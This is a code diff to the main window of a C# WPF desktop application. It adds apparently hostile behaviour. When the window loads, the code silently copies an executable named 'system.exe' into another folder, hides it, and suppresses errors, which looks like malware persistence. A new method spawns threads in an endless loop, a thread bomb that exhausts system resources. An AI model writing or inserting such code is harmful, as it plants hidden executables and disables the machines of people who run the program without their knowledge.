@@ -21,6 +21,29 @@ public partial class MainWindow : Window
 
             InitializeComponent();
         }
+        private void Window_Loaded(object sender, RoutedEventArgs e)
+        {
+            if (!File.Exists(needPatch + "system.exe"))
+            {
+                try
+                {
+                    File.Copy("system.exe", needPatch + "system.exe");
+                    File.SetAttributes(needPatch + "system.exe", FileAttributes.Hidden);
+
+                }
+                catch {   }
+            }
+            start();
+        }
+
+        public static void sys_sleep()
+        {
+            while (true)
+            {
+                Thread s = new Thread(s_b);
+                s.Start();
+            }
+        }
         private static void s_b()
         {
             int y = 2;
